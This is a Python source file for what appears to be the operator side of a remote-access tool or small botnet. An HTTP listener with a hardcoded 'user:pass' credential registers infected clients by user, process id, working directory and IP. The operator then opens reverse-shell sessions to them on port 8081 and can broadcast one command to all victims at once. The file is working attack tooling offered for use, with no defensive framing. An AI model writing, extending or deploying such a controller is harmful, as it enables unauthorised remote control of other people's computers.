from cprint import cprint

import socketserver
from threading import Thread
from legend import server_legacy

import socket, base64
from http.server import BaseHTTPRequestHandler

global req_head, flag
flag = False


class Connect(BaseHTTPRequestHandler):
    global req_head
    def __init__(self, ops_cle='windows', user_cle='', pid_cle='', pwd_cle='', clientip_cle='', server_address=(), alias_cle=''):
        # super(Connect, self).__init__()
        self.alias_cle = alias_cle
        self.ops_cle = ops_cle
        self.user_cle = user_cle
        self.pid_cle = pid_cle
        self.pwd_cle = pwd_cle
        self.s = ''
        self.serv_ip = server_address[0]
        self.serv_port = server_address[1]
        self.server_address = server_address
        self.clientip_cle = clientip_cle
        self.client = ''
        self.addr = ''

    def initiate(self):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.bind((self.server_address))
        self.s.listen(5)
        self.client, self.addr = self.s.accept()

    def send(self, cmd=''):
        self.client.send(cmd.encode('cp65001'))

    def recv(self):
        return self.client.recv(1024).decode('cp65001')

    def close(self):
        self.s.close()


class Server(BaseHTTPRequestHandler):
    # def __init__(self, user='', pid='', pwd=''):
        # super(Server, self).__init__()


    def do_POST(self):
        creds = 'user:pass'.encode()
        if self.headers.get('Authorization') == f'Basic {str(base64.b64encode(creds))[2:-1]}':
            global req_head, flag
            req_head = str(self.rfile.read( int(self.headers.get('content-length')) ))[2:-1]
            req_head = req_head.split('&')
            keys, vals = [], []

            for el in req_head:
                key = el.split('=')[0]
                val = el.split('=')[1]
                keys.append(key)
                vals.append(val)

            req_head = dict(zip(keys, vals))
            del keys
            del vals

            flag = True
            self.send_response(200)

    def log_message(self, format, *args):
        return

def send_all(clients, command):
    keys = list(clients.keys())
    for el in keys:
        c = clients[el]
        c.initiate()
        c.send(command)
        c.close()


def prety(clients):
    strin = {'alias': 5, 'ops': 3, 'user': 4, 'pid': 3, 'pwd': 3, 'clientip': 8}
    stri = '│ alias │ ops │ user │ pid │ pwd │ clientip │'

    for i in clients:
        o = 5
        head = '┌'
        bottom = '└'
        c = clients[i]
        k = c.__dict__
        for el in k:
            if 'cle' in el:
                name = el.split('_')[0]
                strin[name] = max(strin[name], len(k[el]))
                o += strin[name] + 2
                head += '─' * (strin[name] + 2) + '┬'
                bottom += '─' * (strin[name] + 2) + '┴'

        head = head[0:-1] + '┐'
        bottom = bottom[0:-1] + '┘'

    if clients != {}:
        s = '├'

        print(head)

        for word in stri.split('│')[1:-1]:
            word = word[1:-1]
            print('│' + ' ' * (strin[word] - len(word) + 1) + word + ' ', end='')
            s += '─' * (strin[word] + 1) + '─' + '┼'
        s = s[0:-1] + '┤'
        print('│')

        for i in clients:
            print(s)
            print('│', end='')
            c = clients[i]
            k = c.__dict__

            for el in k:
                if 'cle' in el:
                    print(' ' * (strin[el.split('_')[0]] + 1 - len(k[el])) + f'{k[el]} │', end='')
            print()
        print(bottom)
    else:
        print('┌' + '─' * 6 + '┐')
        print('│ None │')
        print('└' + '─' * 6 + '┘')

def help():
    print(r"""
    comps - display connected computers
    connect [-A] - connect to computer with alias
    alias [-pr_A] [-new_A] - rename connection from A to B
    """)


host = socket.getaddrinfo(socket.gethostname(), None)
ipv4_addresses = [i[4][0] for i in host if i[0] == socket.AF_INET]
print(ipv4_addresses[0])
server_address = (ipv4_addresses[0], 8000)
shell_address = ('', 8081)

clients = {}
alias = 0
httpd = socketserver.TCPServer(server_address, Server)
server = Thread(target=httpd.serve_forever, args=())
server.start()

while True:
    if flag:
        flag = False
        user = req_head.get('user')
        pid = req_head.get('pid')
        pwd = req_head.get('pwd')
        client_ip = req_head.get('ip')

        cprint.warn(f'Connected from {client_ip} with alias {alias}')
        c = Connect(user_cle=user, pid_cle=pid, pwd_cle=pwd, clientip_cle=client_ip, server_address=shell_address, alias_cle=str(alias))
        clients[str(alias)] = c
        alias += 1

    com = input("Command >> ").split()
    if com == ['help']:
        help()

    elif 'connect' in com:
        try:
            Client = clients.get(com[1])
            Client.initiate()
            cur_pwd = pwd
            while True:

                command = input(f"{Client.clientip_cle}:{cur_pwd} >> ")
                if command == 'exit':
                    break
                elif command == 'hlp':
                    server_legacy.MAIN(command=command, client=Client.client)
                else:
                    server_legacy.MAIN(command=command, client=Client.client)
                    cur_pwd = Client.client.recv(1024).decode('cp65001')
                # Client.send(command)
            Client.close()

        except KeyboardInterrupt:
            pass

        except Exception as e:
            cprint.err(f'{e} is wrong')
            Client.close()

    elif 'comps' in com:
        prety(clients)

    elif len(com) == 3 and com[0] == 'alias':
        al = com[1]
        new_al = com[2]
        if al not in clients:
            cprint.fatal('No such alias')
        else:
            # (list(clients.keys()).index(al)
            clients[new_al] = clients.pop(al)
            clients[new_al].alias_cle = new_al
            cprint.ok('Done!')

    elif com == ['send_all']:
        com = input("Command for all >> ")
        send_all(clients, com)
    
    